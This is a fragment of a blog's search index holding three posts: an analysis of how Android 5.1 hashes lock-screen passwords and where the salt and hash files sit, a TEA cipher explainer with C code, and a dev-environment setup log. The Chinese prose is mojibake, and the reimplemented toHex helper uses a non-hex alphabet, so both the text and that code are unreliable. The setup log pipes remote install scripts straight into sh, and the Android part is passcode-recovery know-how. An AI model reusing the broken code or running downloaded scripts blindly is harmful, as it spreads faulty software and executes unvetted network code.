","date":"2018-07-25T00:00:00+08:00","permalink":"https://ykiko.top/p/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","title":"Javaåå°„æœºåˆ¶å­¦ä¹ ç¬”è®°"},{"content":"Androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡1 ç¬¬ä¸€ç«  Androidä¸­é”å±å¯†ç åŠ å¯†ç®—æ³•åˆ†æ 1. é”å±å¯†ç æ–¹å¼ï¼š æ‰‹åŠ¿\nä¹å®«æ ¼è¿çº¿\nè¾“å…¥å¯†ç \næŒ‡çº¹ã€äººè„¸ã€è™¹è†œ\nå¯ç©¿æˆ´è®¾å¤‡\n2. è¿™å„¿åˆ†ææ‰‹åŠ¿å¯†ç å’Œè¾“å…¥å¯†ç  æ‰¾åˆ°androidæºä»£ç ä¸­çš„LockPatternUtils,java è¿™ä¸ªå·¥å…·ç±»\nè·¯å¾„ï¼šAndroid-5.1.1\\frameworks\\base\\core\\java\\com\\android\\internal\\widget\n2.1 è¾“å…¥å¯†ç ç®—æ³•åˆ†æ (5.1ç‰ˆæœ¬çš„æºä»£ç  å’Œä¹¦ä¸Šç»†å¾®å·®å¼‚)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public byte[] passwordToHash(String password, int userId) {//å‚æ•°ä¸ºå¯†ç å’Œå¯¹åº”ç”¨æˆ·ID é»˜è®¤0 if (password == null) { return null; } try { byte[] saltedPassword = (password + getSalt(userId)).getBytes(); byte[] sha1 = MessageDigest.getInstance(\u0026#34;SHA-1\u0026#34;).digest(saltedPassword); byte[] md5 = MessageDigest.getInstance(\u0026#34;MD5\u0026#34;).digest(saltedPassword); //é¦–å…ˆè®© password+saltå€¼ å†SHA-1å’ŒMD5 byte[] combined = new byte[sha1.length + md5.length]; System.arraycopy(sha1, 0, combined, 0, sha1.length); System.arraycopy(md5, 0, combined, sha1.length, md5.length); //è£…æ¢æˆhexå€¼ å†æ‹¼æ¥èµ·æ¥ final char[] hexEncoded = HexEncoding.encode(combined); return new String(hexEncoded).getBytes(StandardCharsets.UTF_8); } catch (NoSuchAlgorithmException e) { throw new AssertionError(\u0026#34;Missing digest algorithm: \u0026#34;, e); } } å¦‚ä½•è·å–è®¾å¤‡å¯¹åº”çš„saltå€¼ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 private String getSalt(int userId) { long salt = getLong(LOCK_PASSWORD_SALT_KEY, 0, userId); if (salt == 0) { //å€¼ä¸º0 é‡æ–°ç”Ÿæˆ try { salt = SecureRandom.getInstance(\u0026#34;SHA1PRNG\u0026#34;).nextLong(); setLong(LOCK_PASSWORD_SALT_KEY, salt, userId); //ä¿å­˜å€¼ Log.v(TAG, \u0026#34;Initialized lock password salt for user: \u0026#34; + userId); } catch (NoSuchAlgorithmException e) { throw new IllegalStateException(\u0026#34;Couldn\u0026#39;t get SecureRandom number\u0026#34;, e); } } return Long.toHexString(salt); // hexä¹‹åè¿”å› } ç»§ç»­è·Ÿè¸ª çœ‹ä¿å­˜çš„åœ°æ–¹\n1 2 3 4 5 6 7 private long getLong(String secureSettingKey, long defaultValue, int userHandle) { try { return getLockSettings().getLong(secureSettingKey, defaultValue, userHandle); } catch (RemoteException re) { return defaultValue; } } ç»§ç»­è·Ÿè¸ªä»£ç \n1 2 3 4 5 6 7 8 9 @VisibleForTesting public ILockSettings getLockSettings() { if (mLockSettingsService == null) { ILockSettings service = ILockSettings.Stub.asInterface( ServiceManager.getService(\u0026#34;lock_settings\u0026#34;)); //è·å–æœåŠ¡æ¥æ“ä½œ mLockSettingsService = service; } return mLockSettingsService; } åœ¨androidä¸­ è¿™ç§è·å–æœåŠ¡çš„æ–¹å¼æœ€ç»ˆå®ç°é€»è¾‘éƒ½æ˜¯åœ¨XXXServiceç±»ä¸­\nè¿™é‡Œåœ¨LockSettingService.javaä¸­ æ‰¾åˆ°è¿™ä¸ªç±»çš„getLongæ–¹æ³•\n1 2 3 4 5 public long getLong(String key, long defaultValue, int userId) { checkReadPermission(key, userId); String value = getStringUnchecked(key, null, userId); return TextUtils.isEmpty(value) ? defaultValue : Long.parseLong(value); } ä¿å­˜åœ¨æ•°æ®åº“ï¼Ÿ\nç»§ç»­è·Ÿè¸ª\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 static class Injector { protected Context mContext; public Injector(Context context) { mContext = context; } public Context getContext() { return mContext; } public Handler getHandler() { return new Handler(); } public LockSettingsStorage getStorage() { final LockSettingsStorage storage = new LockSettingsStorage(mContext); storage.setDatabaseOnCreateCallback(new LockSettingsStorage.Callback() { @Override public void initialize(SQLiteDatabase db) { // Get the lockscreen default from a system property, if available boolean lockScreenDisable = SystemProperties.getBoolean( \u0026#34;ro.lockscreen.disable.default\u0026#34;, false); if (lockScreenDisable) { storage.writeKeyValue(db, LockPatternUtils.DISABLE_LOCKSCREEN_KEY, \u0026#34;1\u0026#34;, 0); } } }); return storage; } public LockSettingsService(Context context) { this(new Injector(context)); } ç»§ç»­ æŸ¥çœ‹LockSettingsStorage.java ç±»ä¸­ å­˜åœ¨æ•°æ®åº“ä¸­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 static class DatabaseHelper extends SQLiteOpenHelper { private static final String TAG = \u0026#34;LockSettingsDB\u0026#34;; private static final String DATABASE_NAME = \u0026#34;locksettings.db\u0026#34;; private static final int DATABASE_VERSION = 2; private static final int IDLE_CONNECTION_TIMEOUT_MS = 30000; private Callback mCallback; public DatabaseHelper(Context context) { super(context, DATABASE_NAME, null, DATABASE_VERSION); setWriteAheadLoggingEnabled(true); // Memory optimization - close idle connections after 30s of inactivity setIdleConnectionTimeout(IDLE_CONNECTION_TIMEOUT_MS); } public void setCallback(Callback callback) { mCallback = callback; } private void createTable(SQLiteDatabase db) { db.execSQL(\u0026#34;CREATE TABLE \u0026#34; + TABLE + \u0026#34; (\u0026#34; + \u0026#34;_id INTEGER PRIMARY KEY AUTOINCREMENT,\u0026#34; + COLUMN_KEY + \u0026#34; TEXT,\u0026#34; + COLUMN_USERID + \u0026#34; INTEGER,\u0026#34; + COLUMN_VALUE + \u0026#34; TEXT\u0026#34; + \u0026#34;);\u0026#34;); } @Override public void onCreate(SQLiteDatabase db) { createTable(db); if (mCallback != null) { mCallback.initialize(db); } } @Override public void onUpgrade(SQLiteDatabase db, int oldVersion, int currentVersion) { int upgradeVersion = oldVersion; if (upgradeVersion == 1) { // Previously migrated lock screen widget settings. Now defunct. upgradeVersion = 2; } if (upgradeVersion != DATABASE_VERSION) { Log.w(TAG, \u0026#34;Failed to upgrade database!\u0026#34;); } } } çœ‹åˆ°äº†æ•°æ®åº“çš„åå­—å«ä½œï¼šlocksettings.db ä¿å­˜åœ¨äº†ï¼š\n1 2 3 4 5 6 7 8 private static final String SYSTEM_DIRECTORY = \u0026#34;/system/\u0026#34;; //ç›®å½• private static final String LOCK_PATTERN_FILE = \u0026#34;gatekeeper.pattern.key\u0026#34;; private static final String BASE_ZERO_LOCK_PATTERN_FILE = \u0026#34;gatekeeper.gesture.key\u0026#34;; private static final String LEGACY_LOCK_PATTERN_FILE = \u0026#34;gesture.key\u0026#34;; //key1 private static final String LOCK_PASSWORD_FILE = \u0026#34;gatekeeper.password.key\u0026#34;; private static final String LEGACY_LOCK_PASSWORD_FILE = \u0026#34;password.key\u0026#34;; //key2 private static final String CHILD_PROFILE_LOCK_FILE = \u0026#34;gatekeeper.profile.key\u0026#34;; private static final String SYNTHETIC_PASSWORD_DIRECTORY = \u0026#34;spblob/\u0026#34;; æ•°æ®åº“æ–‡ä»¶å­˜åœ¨/data/system/locksetting.db\næµ‹è¯• åœ¨/data/system/ä¸‹çœ‹åˆ°password.key\næ‰“å¼€çœ‹çœ‹ï¼š\næ‰‹åŠ¨ç®€å•å®ç°åŠ å¯†ç®—æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 public byte[] passwordToHash(String password) { if (password == null) { return null; } byte [] hashed = null; try { byte[] saltedPassword = (password + SALT).getBytes(); //SALT å€¼ä»æ•°æ®åº“ä¸­å¾—åˆ° æ‹¿åˆ°ä¹‹åè¿›è¡Œhexè½¬æ¢ byte[] sha1 = MessageDigest.getInstance(\u0026#34;SHA-1\u0026#34;).digest(saltedPassword); byte[] md5 = MessageDigest.getInstance(\u0026#34;MD5\u0026#34;).digest(saltedPassword); hashed = (toHex(sha1)+toHex(md5)).getBytes(); } catch(Exception e){ } return hashed; } private static String toHex(byte[] ary){ final String hex = \u0026#34;102031398sjdfklaj\u0026#34;; String ret = \u0026#34;\u0026#34;; for(int i=0;i\u0026lt;ary.length;i++){ ret += hex.charAt((ary[i]\u0026gt;\u0026gt; 4)\u0026amp; 0xf); ret += hex.charAt(ary[i]\u0026amp; 0xf); } return ret; } SALT çš„å€¼å¯ä»¥ä»æ•°æ®åº“ä¸­æ‹¿åˆ° ä¹Ÿå¯ä»¥åˆ©ç”¨åå°„è·å–\næ€»ç»“ï¼š\nâ€‹ MD5(è¾“çš„æ˜æ–‡å¯†ç +è®¾å¤‡çš„salt).hex+ SHA1(è¾“çš„çš„æ˜æ–‡å¯†ç +è®¾å¤‡çš„saltå€¼).hex\n2.2 æ‰‹åŠ¿å¯†ç åˆ†æ\nå¤§è‡´åŒä¸Š\n3. ç®€è¦ï¼š â€‹ ä¹å®«æ ¼å›¢è£…åŒ–æˆå­—èŠ‚æ•°ç»„-\u0026gt;sha1 åŠ å¯† å³å¯\nå…¶å®å¤§è‡´æµç¨‹å’Œåˆ†æè¾“å…¥å¯†ç å·®ä¸å¤š ä¿å­˜åˆ°æœ¬åœ°çš„ç›®å½•/data/system/gesture.key æ–‡ä»¶\n","date":"2018-07-02T17:33:00+08:00","permalink":"https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%871/","title":"Androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡1"},{"content":"TEAåŠ å¯†ä¸è§£å¯† TEAåŠ å¯†ä¸è§£å¯† TEAç®—æ³•ç”±å‰‘æ¡¥å¤§å­¦è®¡ç®—æœºå®éªŒå®¤çš„David Wheelerå’ŒRoger Needhamäº1994å¹´å‘æ˜ã€‚å®ƒæ˜¯ä¸€ç§åˆ†ç»„å¯†ç ç®—æ³•ï¼Œå…¶æ˜æ–‡å¯†æ–‡å—ä¸º64æ¯”ç‰¹ï¼Œå¯†é’¥é•¿åº¦ä¸º128æ¯”ç‰¹ã€‚TEAç®—æ³•åˆ©ç”¨ä¸æ–­å¢åŠ çš„Delta(é»„é‡‘åˆ†å‰²ç‡)å€¼ä½œä¸ºå˜åŒ–ï¼Œä½¿å¾—æ¯è½®çš„åŠ å¯†æ˜¯ä¸åŒï¼Œè¯¥åŠ å¯†ç®—æ³•çš„è¿­ä»£æ¬¡æ•°å¯ä»¥æ”¹å˜ï¼Œå»ºè®®çš„è¿­ä»£æ¬¡æ•°ä¸º32è½®ã€‚\nåœ¨æ¸¸æˆé¡¹ç›®ä¸­ï¼Œä¸€èˆ¬éœ€è¦å¯¹èµ„æºæˆ–æ•°æ®è¿›è¡ŒåŠ å¯†ä¿æŠ¤ï¼Œæœ€ç®€å•é«˜æ•ˆçš„åŠ å¯†ç®—æ³•å°±æ˜¯é‡‡ç”¨ä½ä¸æˆ–ä¹‹ç±»çš„ï¼Œä½†æ˜¯æ¯”è¾ƒå®¹æ˜“è¢«äººåˆ†æå‡ºæ¥ã€‚ TEAåŠ å¯†ç®—æ³•ä¸ä½†æ¯”è¾ƒç®€å•ï¼Œè€Œä¸”æœ‰å¾ˆå¼ºçš„æŠ—å·®åˆ†åˆ†æèƒ½åŠ›ï¼ŒåŠ å¯†é€Ÿåº¦ä¹Ÿæ¯”è¾ƒå¿«ã€‚å¯ä»¥æ ¹æ®é¡¹ç›®éœ€æ±‚è®¾ç½®åŠ å¯†è½®æ•°æ¥å¢åŠ åŠ å¯†å¼ºåº¦ã€‚ä¸»è¦è¿ç”¨äº†ç§»ä½å’Œå¼‚æˆ–è¿ç®—ã€‚å¯†é’¥åœ¨åŠ å¯†è¿‡ç¨‹ä¸­å§‹ç»ˆä¸å˜ã€‚\nå·®åˆ†åˆ†ææ˜¯ä¸€ç§é€‰æ‹©æ˜æ–‡æ”»å‡»ï¼Œå…¶åŸºæœ¬æ€æƒ³æ˜¯ï¼šé€šè¿‡åˆ†æç‰¹å®šæ˜æ–‡å·®åˆ†å¯¹ç›¸å¯¹åº”å¯†æ–‡å·®åˆ†å½±å“æ¥è·å¾—å°½å¯èƒ½å¤§çš„å¯†é’¥ã€‚å®ƒå¯ä»¥ç”¨æ¥æ”»å‡»ä»»ä½•ç”±è¿­ä»£ä¸€ä¸ªå›ºå®šçš„è½®å‡½æ•°çš„ç»“æ„çš„å¯†ç ä»¥åŠå¾ˆå¤šåˆ†ç»„å¯†ç ï¼ˆåŒ…æ‹¬DESï¼‰ï¼Œå®ƒæ˜¯ç”±Bihamå’ŒShamiräº1991å¹´æå‡ºçš„é€‰æ‹©æ˜æ–‡æ”»å‡»ã€‚\nåŠ å¯†æ ¸å¿ƒå‡½æ•°\n1 void EncryptTEA(unsigned int *firstChunk, unsigned int *secondChunk, unsigned int* key){ unsigned int y = *firstChunk; unsigned int z = *secondChunk; unsigned int sum = 0; unsigned int delta = 0x9e3779b9; for (int i = 0; i \u0026lt; 8; i++) //8è½®è¿ç®—(éœ€è¦å¯¹åº”ä¸‹é¢çš„è§£å¯†æ ¸å¿ƒå‡½æ•°çš„è½®æ•°ä¸€æ ·) { sum += delta; y += ((z \u0026lt;\u0026lt; 4) + key[0]) ^ (z + sum) ^ ((z \u0026gt;\u0026gt; 5) + key[1]); z += ((y \u0026lt;\u0026lt; 4) + key[2]) ^ (y + sum) ^ ((y \u0026gt;\u0026gt; 5) + key[3]); } *firstChunk = y; *secondChunk = z;} ç®—æ³•ä½¿ç”¨äº†ä¸€ä¸ªç¥ç§˜å¸¸æ•°Î´ä½œä¸ºå€æ•°ï¼Œå®ƒæ¥æºäºé»„é‡‘æ¯”ç‡ï¼Œä»¥ä¿è¯æ¯ä¸€è½®åŠ å¯†éƒ½ä¸ç›¸åŒã€‚ä½†Î´çš„ç²¾ç¡®å€¼ä¼¼ä¹å¹¶ä¸é‡è¦ï¼Œè¿™é‡Œ TEA æŠŠå®ƒå®šä¹‰ä¸º Î´=ã€Œ(âˆš5 - 1)231ã€â€“\u0026gt; delta = 0x9e3779b9;\nè§£å¯†æ ¸å¿ƒå‡½æ•°\n1 void DecryptTEA(unsigned int *firstChunk, unsigned int *secondChunk, unsigned int* key){ unsigned int sum = 0; unsigned int y = *firstChunk; unsigned int z = *secondChunk; unsigned int delta = 0x9e3779b9; sum = delta \u0026lt;\u0026lt; 3; //32è½®è¿ç®—ï¼Œæ‰€ä»¥æ˜¯2çš„5æ¬¡æ–¹ï¼›16è½®è¿ç®—ï¼Œæ‰€ä»¥æ˜¯2çš„4æ¬¡æ–¹ï¼›8è½®è¿ç®—ï¼Œæ‰€ä»¥æ˜¯2çš„3æ¬¡æ–¹ for (int i = 0; i \u0026lt; 8; i++) //8è½®è¿ç®— { z -= (y \u0026lt;\u0026lt; 4) + key[2] ^ y + sum ^ (y \u0026gt;\u0026gt; 5) + key[3]; y -= (z \u0026lt;\u0026lt; 4) + key[0] ^ z + sum ^ (z \u0026gt;\u0026gt; 5) + key[1]; sum -= delta; } *firstChunk = y; *secondChunk = z;} ","date":"2018-01-17T00:00:00+08:00","permalink":"https://ykiko.top/p/tea%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/","title":"TEAåŠ å¯†ä¸è§£å¯†"},{"content":"EnvRecord ç”¨æ¥ä¸æ—¶è®°å½•å¹³æ—¶æ‰€ç”¨ç¯å¢ƒé…ç½®ï¼Œä»¥åŠé‡åˆ°çš„å„ç§é—®é¢˜ä»¥åŠè§£å†³åŠæ³•ã€‚ä¸»è¦æ˜¯ä¸ºäº†é˜²ä¸¢å¤±ï¼Œä»¥åŠæ€»æ˜¯å’Œç©ºæ°”æ–—å¿—æ–—å‹‡ã€‚\nWin10 æ—¥å¸¸ä½¿ç”¨\nWSL é»˜è®¤ä¸æ˜¯root è®¾ç½®é»˜è®¤rootç”¨æˆ·ã€‚ubuntu config --default-user root\non my zsh è£…ä¸Š\nå®˜æ–¹github\néœ€è¦å…ˆå®‰è£…ZSHã€‚\nå®‰è£…on my zsh:\nvia curlï¼šsh -c \u0026quot;$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\u0026quot;\nvia wget:Â sh -c \u0026quot;$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)\u0026quot;\nç„¶åé…ç½®å–œæ¬¢çš„ æ’ä»¶+ä¸»é¢˜ã€‚vi ~/.zshrcÂ ä¿®æ”¹pluginså±æ€§\nå¿…å¤‡æ’ä»¶gitã€autojumpã€zsh-autosuggestionsã€‚ä¸»é¢˜\nGDBè£…ä¸Š+pwndbg+peda+gef\nwslçš„ubuntuä¸æ”¯æŒx86ï¼Œæ‰€ä»¥ä¸»è¦åªèƒ½è°ƒè¯•x64çš„ç¨‹åºï¼Œè€Œä¸”å¯èƒ½ä¼šå‡ºç°è«åå…¶å¦™çš„é”™è¯¯ã€‚\nä¸è¿‡å¯ä»¥ä½¿ç”¨qemuæ¥è¿è¡Œx86çš„ç¨‹åºï¼Œè°ƒè¯•è¿˜æ˜¯ä¸è¡Œä¼šå‡ºé”™ã€‚å‚è€ƒ\n1 2 3 4 5 sudo apt update sudo apt install qemu-user-static sudo update-binfmts --install i386 /usr/bin/qemu-i386-static --magic \u0026#39;\\x7fELF\\x01\\x01\\x01\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x03\\x00\\x01\\x00\\x00\\x00\u0026#39; --mask \u0026#39;\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xfc\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xf8\\xff\\xff\\xff\\xff\\xff\\xff\\xff\u0026#39; # è¿è¡Œä¸‹é¢çš„ä¸€æ¡å‘½ä»¤å°±è¡Œè·‘x86 ä¸è¿‡æ¯æ¬¡æ‰“å¼€wsléƒ½å¾—è¿è¡Œä¸€æ¬¡ï¼Œå¾ˆéº»çƒ¦ï¼Œå¯ä»¥å†™è„šæœ¬è‡ªåŠ¨å¼€å¯ã€‚ sudo service binfmt-support start pwndbg+peda+gef\nä¸‰ä¸ªéƒ½å¯èƒ½ç”¨åˆ°ï¼Œä¸‰ä¸ªå·¥å…·ç‰¹æ€§ä¸ä¸€æ ·ã€‚å„æœ‰å¼ºé¡¹ï¼Œæ‰€ä»¥ä¸‰ä¸ªéƒ½è£…ï¼Œä½¿ç”¨è„šæœ¬gdb.shå¯åŠ¨é€‰é¡¹\nå®‰è£…pwndbg:\n1 2 3 git clone https://github.com/pwndbg/pwndbg cd pwndbg ./setup.sh peda:\n1 2 git clone https://github.com/longld/peda.git ~/peda echo \u0026#34;source ~/peda/peda.py\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit gef:\n1 2 3 4 5 6 # via the install script $ wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh # manually $ wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py $ echo source ~/.gdbinit-gef.py \u0026gt;\u0026gt; ~/.gdbinit gdb.sh æŠŠè¯¥æ–‡ä»¶æ”¾åœ¨/usr/local/sbinÂ å‚è€ƒ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 #!/bin/bash function Mode_change { name=$1 gdbinitfile=~/.gdbinit#è¿™ä¸ªè·¯å¾„æŒ‰ç…§ä½ çš„å®é™…æƒ…å†µä¿®æ”¹# gdbinitfile=/root/Desktop/mode#è·¯å¾„æŒ‰ç…§ä½ çš„å®é™…æƒ…å†µä¿®æ”¹ peda=\u0026#34;source ~/peda/peda.py\u0026#34; gef=\u0026#34;source ~/.gdbinit-gef.py\u0026#34; pwndbg=\u0026#34;source /home/pwndbg/gdbinit.py\u0026#34; sign=$(cat $gdbinitfile | grep -n \u0026#34;#this place is controled by user\u0026#39;s shell\u0026#34;) #æ­¤å¤„ä¸Šé¢çš„æŸ¥æ‰¾å†…å®¹è¦å’Œä½ è‡ªå·±çš„ä¿æŒä¸€è‡´ pattern=\u0026#34;:#this place is controled by user\u0026#39;s shell\u0026#34; number=${sign%$pattern} location=$[number+2] parameter_add=${location}i parameter_del=${location}d message=\u0026#34;TEST\u0026#34; if [ $name -eq \u0026#34;1\u0026#34; ];then sed -i \u0026#34;$parameter_del\u0026#34; $gdbinitfile sed -i \u0026#34;$parameter_add $peda\u0026#34; $gdbinitfile echo -e \u0026#34;Please enjoy the peda!\\n\u0026#34; elif [ $name -eq \u0026#34;2\u0026#34; ];then sed -i \u0026#34;$parameter_del\u0026#34; $gdbinitfile sed -i \u0026#34;$parameter_add $gef\u0026#34; $gdbinitfile echo -e \u0026#34;Please enjoy the gef!\\n\u0026#34; else sed -i \u0026#34;$parameter_del\u0026#34; $gdbinitfile sed -i \u0026#34;$parameter_add $pwndbg\u0026#34; $gdbinitfile echo -e \u0026#34;Please enjoy the pwndbg!\\n\u0026#34; fi } echo -e \u0026#34;Please choose one mode of GDB?\\n1.peda 2.gef 3.pwndbg\u0026#34; read -p \u0026#34;Input your choice:\u0026#34; num if [ $num -eq \u0026#34;1\u0026#34; ];then Mode_change $num elif [ $num -eq \u0026#34;2\u0026#34; ];then Mode_change $num elif [ $num -eq \u0026#34;3\u0026#34; ];then Mode_change $num else echo -e \u0026#34;Error!\\nPleasse input right number!\u0026#34; fi gdb $1 $2 $3 $4 $5 $6 $7 $8 $9# r2å…¨å®¶æ¡¶ ï¼ˆé€†å‘è°ƒè¯•ç¥å™¨ï¼‰\n1 2 3 git clone https://github.com/radare/radare2.git cd radare2 sys/install.sh#Install / Update gcc arm aarch aarch64\nsudo apt install gcc-arm-linux-gnueabiÂ ä½¿ç”¨å‘½ä»¤arm-linux-gnueabi-gcc\nsudo apt install gcc-aarch64-linux-gnuÂ ä½¿ç”¨å‘½ä»¤aarch64-linux-gnu-gcc\nclang+llvm\næ–¹æ³•ä¸€ï¼Œæ‰‹åŠ¨ç¼–è¯‘å®‰è£…ï¼Œè´¹æ—¶è´¹åŠ›\næ–¹æ³•äºŒ apt\nå®Œæ•´æ–¹æ³•è¿™ä¸ªåœ°å€\nåªå†™ubuntu 18,04\nç¼–è¾‘ /etc/apt/sources.listï¼Œæ·»åŠ æº 1 2 3 4 5 6 7 8 9 # i386 not available deb http://apt.llvm.org/bionic/ llvm-toolchain-bionic main deb-src http://apt.llvm.org/bionic/ llvm-toolchain-bionic main # 7 deb http://apt.llvm.org/bionic/ llvm-toolchain-bionic-7 main deb-src http://apt.llvm.org/bionic/ llvm-toolchain-bionic-7 main # 8 deb http://apt.llvm.org/bionic/ llvm-toolchain-bionic-8 main deb-src http://apt.llvm.org/bionic/ llvm-toolchain-bionic-8 main æ·»åŠ è¯ä¹¦ 1 2 wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key|sudo apt-key add - # Fingerprint: 6084 F3CF 814B 57C1 CF12 EFD5 15CF 4D18 AF4F 7421 å®‰è£… ç‰ˆæœ¬8 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # LLVM apt-get install libllvm-8-ocaml-dev libllvm8 llvm-8 llvm-8-dev llvm-8-doc llvm-8-examples llvm-8-runtime # Clang and co apt-get install clang-8 clang-tools-8 clang-8-doc libclang-common-8-dev libclang-8-dev libclang1-8 clang-format-8 python-clang-8 # libfuzzer apt-get install libfuzzer-8-dev # lldb apt-get install lldb-8 # lld (linker) apt-get install lld-8 # libc++ apt-get install libc++-8-dev libc++abi-8-dev # OpenMP apt-get install libomp-8-dev python3+pip\napt install python3 python3-pipã€python-pip\npythonåº“\nfrida ï¼ˆhook) åŒwinä¸‹ä½¿ç”¨\npwntools (py2)\ngmpy2 (py2-3)\nr2Frida\nBrida\nvscode ï¼ˆ666ï¼‰ ä¸»è¦æ˜¯å„ç§æ’ä»¶\nzh-ch ï¼ˆæ±‰åŒ–åŒ…ï¼‰\nbackground ï¼ˆå³ä¸‹è§’å°èŒäººï¼‰\ncmder**Â (Winä¸‹å¼ºå¤§çš„ç»ˆç«¯å·¥å…·)** å®˜ç½‘ä¸‹è½½å®‰è£…\nç®€å•é…ç½®ï¼š\nwsl vim æ— æ³•ä½¿ç”¨ä¸Šä¸‹å·¦å³é”®è§£å†³\npy2-py3 å®˜ç½‘æ‰¾æƒ³è¦çš„åŒ…ä¸‹è½½ï¼ŒåŒæ—¶è£…ä¸¤ä¸ªç‰ˆæœ¬ã€‚\nä¿®æ”¹ç¯å¢ƒå˜é‡ï¼Œæ—¥å¸¸ä½¿ç”¨py3,æŠŠpy3çš„ç¯å¢ƒå˜é‡æ”¾åœ¨å‰é¢ï¼Œå»py2çš„å®‰è£…ç›®å½•å¤åˆ¶ä¸€ä»½python.exe æ›´åä¸ºpython2.exeï¼Œå°±å¯ä»¥ä½¿ç”¨python2ä½œä¸ºå‘½ä»¤è¾“å…¥ã€‚\npipé…ç½®ä¸ºå›½å†…æºä¼šå¿«å¾ˆå¤š\nJava8+jdkæœ€æ–° å®˜ç½‘ä¸‹è½½å®‰è£…\nä¸‹ä¸ªjdkæœ€æ–°ç‰ˆé˜²æ­¢éƒ¨åˆ†å·¥å…·éœ€è¦ã€‚\nå¯èƒ½æœ‰æ—¶å€™è¿˜éœ€è¦é…ç½®ç¯å¢ƒå˜é‡JAVA_HOMEä¸ºJDKè·¯å¾„ã€‚\nGolang ä¹Ÿæ˜¯åªéœ€ä¸‹è½½å®‰è£…å°±ok.\nNodeJS ä¹Ÿæ˜¯åªéœ€ä¸‹è½½å®‰è£…å°±ok. æ¨èç¨³å®šç‰ˆã€‚\nä¼šé»˜è®¤å®‰è£…npmï¼Œç„¶è€Œä¸‹è½½é€Ÿåº¦å®åœ¨å¤ªæ…¢ï¼Œä½¿ç”¨æ·˜å®é•œåƒcnpmÂ ,ç”¨æ³•ç›¸åŒ\nnpm install -g cnpm --registry=https://registry.npm.taobao.org\ngit å®˜ç½‘ä¸‹è½½å®‰è£…å®Œäº‹\nYarn å®˜ç½‘ä¸‹è½½å®‰è£…å®Œäº‹\nCMake ä¸‹è½½å®‰è£…ok\nhugo (åšå®¢å·¥å…·) ä¸‹è½½exeåˆ°æœ¬åœ°ï¼Œé…ç½®ç¯å¢ƒå˜é‡\nHaskell Stack å®˜æ–¹æ–‡æ¡£ã€winç›´æ¥ä¸‹è½½å®‰è£…\nStartlsBack (winä¸‹çš„ç¾åŒ–å·¥å…·) ä¸‹è½½å®‰è£…Â é…ç½®åº•éƒ¨é€æ˜å’Œå±…ä¸­\nNotepad++ (è½»ä¾¿çš„ç¼–è¾‘å™¨) ä¸‹è½½å®‰è£…\nAndroid SDK é…ç½® adbå·¥å…· åœ¨ç›®å½•platform-tools\nemulatorã€monitor åœ¨toolsä¸‹\nNDK-build åœ¨ndk-bundle\nflutter (Google è·¨å¹³å°æ¡†æ¶) æœ‰å®˜ç½‘äº†\nä¸‹è½½SDK-\u0026gt;é…ç½®ç¯å¢ƒå˜é‡Â flutter\\binÂ ã€‚æ·»åŠ åä¸ºâ€PUB_HOSTED_URLâ€å’Œâ€FLUTTER_STORAGE_BASE_URLâ€çš„æ¡ç›®ã€‚\nAndorid Studioè®¾ç½®\nå®‰è£…æ’ä»¶\nFlutteræ’ä»¶ï¼š æ”¯æŒFlutterå¼€å‘å·¥ä½œæµ (è¿è¡Œã€è°ƒè¯•ã€çƒ­é‡è½½ç­‰).\nDartæ’ä»¶ï¼š æä¾›ä»£ç åˆ†æ (è¾“å…¥ä»£ç æ—¶è¿›è¡ŒéªŒè¯ã€ä»£ç è¡¥å…¨ç­‰).\nVScodeè®¾ç½®\nå®‰è£…æ’ä»¶\nflutter Genymotion+é€é¥Android (Android æ¨¡æ‹Ÿå™¨) ä¸‹è½½å®‰è£…ok\nCUDA ï¼ˆNå¡xxx) æ ¹æ®è‡ªå·±çš„æ˜¾å¡å®˜ç½‘ä¸‹è½½åŒ…\næ ¹æ®éœ€æ±‚å®‰è£…ã€‚\næœ‰ä¸ªå‘ï¼Œå¦‚æœä¸ºpytorch æˆ–TensorFlowåšå‰æ å…ˆçœ‹çœ‹è¿™ä¸¤æ”¯æŒçš„ç‰ˆæœ¬å†å®‰è£…ç›¸åº”çš„ç‰ˆæœ¬ã€‚\npytorch éœ€æ±‚å‰ç½®ç¯å¢ƒä¹Ÿå¾—è£…å¥½ å®˜æ–¹æœ‰å¾ˆæ–¹ä¾¿çš„å®‰è£…æ–¹æ³• æ ¹æ®ä¸åŒå¹³å°å’Œç¯å¢ƒ\nTensorFlow å‰ç½®ç¯å¢ƒæŸ¥å®˜ç½‘ 1 2 3 4 5 # GPUç‰ˆæœ¬ py3 pip3 install tensorflow-gpu# stable pip3 install 